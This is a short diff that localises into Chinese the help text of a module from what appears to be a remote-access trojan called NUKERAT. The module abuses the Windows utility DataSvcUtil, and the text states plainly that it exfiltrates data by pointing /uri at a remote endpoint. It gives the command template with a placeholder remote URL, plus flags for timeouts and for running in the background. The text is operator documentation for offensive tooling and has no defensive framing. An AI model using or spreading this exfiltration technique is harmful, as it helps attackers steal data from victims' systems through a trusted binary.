@@ -1,21 +1,21 @@
-ABOUT
+关于
     WCF Data Services client generator.
     Exfiltrates data by pointing /uri at a remote endpoint and writing
     output with /out.
 
-USAGE:
+用法：
     DataSvcUtil /out:{PATH_ABSOLUTE} /uri:{REMOTEURL}
 
-ARGUMENTS:
+参数：
     /out:                        Local output path
     /uri:                        Remote OData or upload URI
 
-EXAMPLES:
+示例：
     DataSvcUtil /out:{PATH_ABSOLUTE} /uri:{REMOTEURL}
 
-NUKERAT FLAGS:
-    -w <seconds>    Maximum wait time until timeout
-    -bg             Fork and run without waiting for output
+NUKERAT 选项：
+    -w <秒数>       等待超时的最大时间
+    -bg             后台运行，不等待输出
 
-    Example:
+    示例：
     DataSvcUtil /out:{PATH_ABSOLUTE} /uri:{REMOTEURL}
